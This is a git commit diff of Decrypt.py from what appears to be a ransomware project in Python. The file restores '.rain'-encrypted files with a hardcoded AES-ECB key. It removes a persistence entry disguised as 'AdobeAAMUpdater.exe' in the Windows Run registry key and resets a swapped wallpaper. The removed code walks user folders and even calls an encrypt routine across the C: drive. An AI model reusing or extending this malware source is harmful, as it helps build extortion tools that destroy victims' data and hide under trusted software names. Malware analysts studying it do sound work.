90e38b55c853774caf45d32fdc58584a726914a6
RetroNietzsche <tutoriaispirata1@gmail.com>
2019-04-30 19:17:26 -0300

    Python decrypt source-code

--- Source-Code/Decrypt.py
+++ Source-Code/Decrypt.py
@@ -1,172 +1,84 @@
-try:
-	import os
-	import shutil
-	import glob
-	import platform
-	from Crypto.Cipher import AES
-	import platform
-	from os import getenv,system
-except:
-	exit()
+from Func import Decrypt
+from os import path,getenv,remove
+from os import system as sys
+from platform import system
+from shutil import copyfile
+from winreg import *
 
-def decrypt(file):
-	file_decrypto = open(file,'rb')
-	file_decrypto = file_decrypto.read()
-	correct = file_decrypto.rstrip(b'#')
-	decifdata = aes.decrypt(file_decrypto)
-	decifile = open(file,'wb')
-	decifile.write(decifdata)
-	decifile.close()
-	os.rename(file,file.rstrip('.rain'))
-
-k='u7x!A%D*G-KaPdSgVkYp3s5v8y/B?E(H'
-aes = AES.new(k, AES.MODE_ECB)
-ext=['*.rain']
-
-sys = platform.system()
-if sys=='Windows':
+s = system()
+if s=='Windows':
 	try:
-		os.remove('C:/Users/Public/prst.bat')
-		os.remove('C:/Users/Public/wd.bat')
-		os.remove('C:/Users/Public/uac.bat')
+		appdata = getenv('APPDATA')
+		dest = appdata+"\\Microsoft\\Windows\\Themes"
+		copyfile(dest+'\\.transold',dest+'\\TranscodedWallpaper')
+		sys("taskkill /f /im explorer.exe")
+		sys("start C:/Windows/explorer.exe")
 	except:
 		pass
 
-	desktop = os.path.expanduser('~/Desktop')
-	documents = os.path.expanduser('~/Documents')
-	downloads = os.path.expanduser('~/Downloads')
-	appdt= getenv('APPDATA')
-
-	os.chdir(desktop)
-	for i in ext:
-		try:
-			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				decrypt(file)
-			except:
-				pass
-
-	os.chdir(documents)
-	for i in ext:
-		try:
-			files = glob.iglob(documents+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				decrypt(file)
-			except:
-				pass
-
-	os.chdir(downloads)
-	for i in ext:
-		try:
-			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				decrypt(file)
-			except:
-				pass
-
 	try:
-		dst = appdt+'/Microsoft/Windows/Themes/'
-		os.chdir(dst)
-		shutil.copy('C:/Users/Public/transold',dst+'TranscodedWallpaper')
+		remove('C:/Users/Public/AdobeAAMUpdater.exe')
 	except:
 		pass
 
-	for i in ext:
-		try:
-			files = glob.iglob('C:/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-elif sys=='Linux':
-	desktop = os.path.expanduser('~/Desktop')
-	area = os.path.expanduser('~/Área de trabalho')
-	documents = os.path.expanduser('~/Documents')
-	documentos = os.path.expanduser('~/Documentos')
-	downloads = os.path.expanduser('~/Downloads')
-	root = os.path.expanduser('/')
+	try:
+		keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+		key = OpenKey(HKEY_LOCAL_MACHINE,keypath,KEY_ALL_ACCESS)
+		DeleteValue(key,'AdobeAAM')
+	except PermissionError:
+		keypath = r'Software\Microsoft\Windows\CurrentVersion\Run'
+		key = OpenKey(HKEY_LOCAL_MACHINE,keypath,KEY_ALL_ACCESS)
+		DeleteValue(key,'AdobeAAM')
+
+	Decrypt.getkey()
 
 	try:
-		os.chdir(desktop)
+		desktop = path.expanduser('~/Desktop')
 	except:
-		os.chdir(area)
-		for i in ext:
-			try:
-				files = glob.iglob(area+'/**/'+(i),recursive=True)
-			except:
-				pass
-			for file in files:
-				try:
-					crypt(file)
-				except:
-					pass
-	for i in ext:
-		try:
-			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
+		pass
 	try:
-		os.chdir(documents)
+		documents = path.expanduser('~/Documents')
 	except:
-		os.chdir(documentos)
-		for i in ext:
-			try:
-				files = glob.iglob(documentos+'/**/'+(i),recursive=True)
-			except:
-				pass
-			for file in files:
-				try:
-					crypt(file)
-				except:
-					pass
+		pass
+	try:
+		downloads = path.expanduser('~/Downloads')
+	except:
+		pass
 
-	for i in ext:
-			try:
-				files = glob.iglob(documents+'/**/'+(i),recursive=True)
-			except:
-				pass
-			for file in files:
-				try:
-					crypt(file)
-				except:
-					pass
+	Decrypt.decryptingcommon(desktop)
+	Decrypt.decryptingcommon(downloads)
+	Decrypt.decryptingcommon(documents)
 
-	os.chdir(downloads)
-	for i in ext:
-		try:
-			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-	os.chdir(root)
-	for i in ext:
-		try:
-			files = glob.iglob(root+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
+	Decrypt.cureall()
+
+elif s=='Linux':
+	Decrypt.getkey()
+
+	try:
+		desktop = path.expanduser('~/Desktop')
+	except:
+		pass
+	try:
+		documents = path.expanduser('~/Documents')
+	except:
+		pass
+	try:
+		downloads = path.expanduser('~/Downloads')
+	except:
+		pass
+	try:
+		area = path.expanduser('~/Área de trabalho')
+	except:
+		pass
+	try:
+		documentos = path.expanduser('~/Documentos')
+	except:
+		pass
+
+	Decrypt.decryptingcommon(desktop)
+	Decrypt.decryptingcommon(downloads)
+	Decrypt.decryptingcommon(documents)
+	Decrypt.decryptingcommon(area)
+	Decrypt.decryptingcommon(documentos)
+
+	Decrypt.cureall()
